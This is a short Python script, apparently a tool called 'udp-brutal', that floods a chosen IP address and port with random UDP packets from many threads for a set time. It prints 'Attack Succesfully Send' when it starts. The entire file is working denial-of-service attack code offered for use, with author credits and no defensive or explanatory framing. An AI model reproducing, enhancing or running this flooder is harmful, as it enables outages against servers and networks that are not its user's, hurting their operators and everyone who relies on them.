# Created By ZeysCuy
# Upgrade PowerFull By @ZOXX_OFC
# Pls Dont Delete Author :)

from time import time as tt
import socket
import random
import os
import sys
import threading

def send_packets(ip, port, time, packet_size):
    startup = tt()
    while True:
        nulled = b""
        data = random._urandom(int(random.randint(500, 1024)))
        data2 = random._urandom(int(random.randint(1025, 65505)))
        data3 = os.urandom(int(random.randint(1025, 65505)))
        data4 = random._urandom(int(random.randint(1, 65505)))
        data5 = os.urandom(int(random.randint(1, 65505)))
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

            endtime = tt()
            if (startup + time) < endtime:
                break

            for x in range(packet_size):
                sock.sendto(nulled, (ip, port))
                sock.sendto(data, (ip, port))
                sock.sendto(data2, (ip, port))
                sock.sendto(data3, (ip, port))
                sock.sendto(data4, (ip, port))
                sock.sendto(data5, (ip, port))
        except:
            pass
        
def attack(ip, port, time, packet_size, threads):
    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(65535, port))

    for _ in range(threads):
        th = threading.Thread(target=send_packets, args=(ip, port, time, packet_size))
        th.start()

    print('Attack Succesfully Send')

if __name__ == '__main__':
    if len(sys.argv) != 6:
        print('Usage: python3 udp-brutal.py <ip> <port> <time> <packet_size> <threads>')
        sys.exit(1)

    ip = sys.argv[1]
    port = int(sys.argv[2])
    time = int(sys.argv[3])
    packet_size = int(sys.argv[4])
    threads = int(sys.argv[5])

    try:
        attack(ip, port, time, packet_size, threads)
    except KeyboardInterrupt:
        print('Attack stopped.')
